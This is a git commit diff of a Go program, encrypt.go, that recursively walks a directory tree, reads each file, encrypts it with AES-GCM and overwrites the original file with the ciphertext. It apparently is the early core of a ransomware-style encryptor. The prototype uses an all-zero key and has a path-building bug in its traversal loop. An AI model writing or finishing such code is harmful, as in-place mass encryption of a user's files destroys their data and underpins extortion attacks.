90ee4d7b9b6890212f1568e34e95d8a481d7bdf7
Dylan Reuter <djreuter45@gmail.com>
2021-05-22 16:17:07 -0500

    add encrypt file

--- encrypt.go
+++ encrypt.go
@@ -13,11 +13,6 @@ var allFiles []string
 
 func main() {
 
-	test := []byte("Test Secret stuff")
-	fmt.Println(string(test))
-	key := make([]byte, 32)
-	fmt.Println(key)
-
 	home, _ := os.UserHomeDir()
 	fmt.Println("home ", home)
 
@@ -30,6 +25,43 @@ func main() {
 	}
 
 	traverseFiles(files, testdir)
+}
+
+func dirRecurse(dirname os.DirEntry, base string) {
+	files, err := os.ReadDir(base)
+	if err != nil {
+		fmt.Println(err)
+		os.Exit(1)
+	}
+	traverseFiles(files, base)
+}
+
+func traverseFiles(files []os.DirEntry, base string) {
+	for _, file := range files {
+		if file.IsDir() {
+			fmt.Println("traverseFiles read dir path: ", base+"\\"+file.Name())
+			base = base + "\\" + file.Name()
+			dirRecurse(file, base)
+		} else {
+			fmt.Println("traverseFiles read file path: ", base+"\\"+file.Name())
+			path := base + "\\" + file.Name()
+			data, err := os.ReadFile(path)
+			if err != nil {
+				fmt.Println(err)
+				os.Exit(1)
+			}
+			encryptFile(data, path)
+			fmt.Println("file data: ", data)
+		}
+	}
+}
+
+func encryptFile(file []byte, path string) {
+	fmt.Println("file contents ", string(file))
+	fmt.Println("path ", path)
+
+	key := make([]byte, 32)
+	fmt.Println("key ", key)
 
 	c, err := aes.NewCipher(key)
 	if err != nil {
@@ -51,34 +83,7 @@ func main() {
 		os.Exit(1)
 	}
 
-	data := gcm.Seal(nonce, nonce, test, nil)
-	fmt.Println(data)
-	os.WriteFile("data.enc", data, 0777)
-}
-
-func dirRecurse(dirname os.DirEntry, base string) {
-	files, err := os.ReadDir(base)
-	if err != nil {
-		fmt.Println(err)
-		os.Exit(1)
-	}
-	traverseFiles(files, base)
-}
-
-func traverseFiles(files []os.DirEntry, base string) {
-	for _, file := range files {
-		if file.IsDir() {
-			fmt.Println("traverseFiles read dir path: ", base+"\\"+file.Name())
-			base = base + "\\" + file.Name()
-			dirRecurse(file, base)
-		} else {
-			fmt.Println("traverseFiles read file path: ", base+"\\"+file.Name())
-			data, err := os.ReadFile(base + "\\" + file.Name())
-			if err != nil {
-				fmt.Println(err)
-				os.Exit(1)
-			}
-			fmt.Println("file data: ", data)
-		}
-	}
+	data := gcm.Seal(nonce, nonce, file, nil)
+	fmt.Println("enc data ", data)
+	os.WriteFile(path, data, 0777)
 }
